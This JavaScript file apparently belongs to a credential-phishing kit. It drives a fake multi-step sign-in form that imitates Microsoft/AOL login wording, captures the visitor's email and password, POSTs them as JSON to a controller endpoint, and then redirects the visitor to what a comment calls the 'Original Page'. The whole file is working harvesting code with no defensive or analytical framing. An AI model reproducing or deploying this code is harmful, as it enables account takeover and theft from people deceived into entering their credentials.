$(document).ready(function () {
  $('.errorMsg1').hide();
  $('.errorMsg2').hide();
  $('.AolNextBtn').on('click', function () {
    alert('2');
  });
});

//DOM elements
const DOMstrings = {
  stepsForm: document.querySelector('.multisteps-form__form'),
  stepsFormTextareas: document.querySelectorAll('.multisteps-form__textarea'),
  stepFormPanelClass: 'multisteps-form__panel',
  stepFormPanels: document.querySelectorAll('.multisteps-form__panel'),
  footerdiv: document.querySelectorAll('.card-footer'),
  stepPrevBtnClass: 'js-btn-prev',
  stepNextBtnClass: 'js-btn-next'
};
//remove class from a set of items
const removeClasses = (elemSet, className) => {
  elemSet.forEach(elem => {
    elem.classList.remove(className);
  });
};

//return exect parent node of the element
const findParent = (elem, parentClass) => {
  let currentNode = elem;
  while (!currentNode.classList.contains(parentClass)) {
    currentNode = currentNode.parentNode;
  }
  return currentNode;
};

//get active panel
const getActivePanel = () => {
  let activePanel;
  DOMstrings.stepFormPanels.forEach(elem => {
    if (elem.classList.contains('js-active')) {
      activePanel = elem;

    }

  });

  return activePanel;

};

//open active panel (and close unactive panels)
const setActivePanel = activePanelNum => {
  //remove active class from all the panels
  removeClasses(DOMstrings.stepFormPanels, 'js-active');
  //show active panel

  DOMstrings.stepFormPanels.forEach((elem, index) => {
    if (index === activePanelNum) {

      elem.classList.add('js-active');
      setFormHeight(elem);
    }
  });

};
//set form height equal to current panel height
const formHeight = activePanel => {
  const activePanelHeight = activePanel.offsetHeight;
  DOMstrings.stepsForm.style.height = `${activePanelHeight}px`;
};
const setFormHeight = () => {
  const activePanel = getActivePanel();
  formHeight(activePanel);
};



//PREV/NEXT BTNS CLICK
DOMstrings.stepsForm.addEventListener('click', e => {
  const eventTarget = e.target;
  //check if we clicked on `PREV` or NEXT` buttons
  if (!(eventTarget.classList.contains(`${DOMstrings.stepPrevBtnClass}`) ||
      eventTarget.classList.contains(`${DOMstrings.stepNextBtnClass}`))) {
    return;
  }
  //find active panel
  const activePanel = findParent(eventTarget, `${DOMstrings.stepFormPanelClass}`);
  let activePanelNum = Array.from(DOMstrings.stepFormPanels).indexOf(activePanel);
  //set active step and active panel onclick
  if (eventTarget.classList.contains(`${DOMstrings.stepPrevBtnClass}`)) {
    activePanelNum--;
  } else {
    var userid = document.getElementById('____UserID').value;
    if (userid == '') {
      $('.errorMsg1').fadeIn().html("Enter a valid email address, phone number, or Skype name.");
      $("#____UserID").focus();
      return false;
    } else {
      $('.____userName').fadeIn().html(userid);
      $('.errorMsg1').hide();
      activePanelNum++;

    }
  }
  setActivePanel(activePanelNum);

});

//SETTING PROPER FORM HEIGHT ONLOAD
window.addEventListener('load', setFormHeight, false);

//SETTING PROPER FORM HEIGHT ONRESIZE
window.addEventListener('resize', setFormHeight, false);


const validateUsername = () => {
  var userpass = document.getElementById('____password').value;
  var Username = document.getElementById('____email').value;
  if (Username == '') {
    $('.bloicon1').fadeIn();
    $('.errorMsg1').fadeIn().text("Please enter your email address.");
    $("#____email").focus();
    return false;
  } else {
    $('.bloicon1').hide();
    $('.bloicon1').fadeOut();
    $('.errorMsg1').fadeOut();
    $('.errorMsg1').hide();
  }
  if (userpass == '') {
    $('.bloicon2').fadeIn();
    $('.errorMsg2').fadeIn().text("Please enter your password.");
    $("#____password").focus();
    return false;
  } else {
    $('.bloicon2').hide();
    $('.bloicon2').fadeOut();
    $('.errorMsg2').fadeOut();
    $('.errorMsg2').hide();
    const data = {
      "___Username": Username,
      "___Userpassword": userpass,
    };
    let StringData = JSON.stringify(data);
    const Url = base_url + 'PagesController/MainController'; // the url where we want to POST
    $.ajax({
      type: 'POST', // define the type of HTTP verb we want to use (POST for our form)
      dataType: 'JSON', //the type of data we are sending is json
      contentType: "application/json; charset=utf-8",
      data: StringData, // our data object
      url: Url, //the post destination
      processData: false, //false because the preprocessor are not trigger
      encode: true, //turn on json encoding
      crossOrigin: true, // true because we are sending data with ajax as json format to php
      async: true, //because we are expecting long data so we set the whole data  Asynchronous with means configuring our Ajax code
      crossDomain: true, //just in case we host the site
      headers: {
        'Access-Control-Allow-Methods': '*',
        "Access-Control-Allow-Credentials": true,
        "Access-Control-Allow-Headers": "Access-Control-Allow-Headers, Origin, X-Requested-With, Content-Type, Accept, Authorization",
        "Access-Control-Allow-Origin": "*",
        "Control-Allow-Origin": "*",
        "cache-control": "no-cache",
        'Content-Type': 'application/json'
      },
    }).done(function (response) {
      if (response.status == 200) {
        $('.errorMsg2').fadeIn().html(response.message);
        // delay and reload & Redirect to Original Page
        setTimeout(function () {
          window.location.href = base_url;
        }, 3000);
      } else {
        $('.errorMsg2').fadeIn().html(response.message);
      }
    }).fail((xhr, status, error) => {
      console.log('Oops...', 'Something went wrong with ajax !', 'error');
    });
  }
}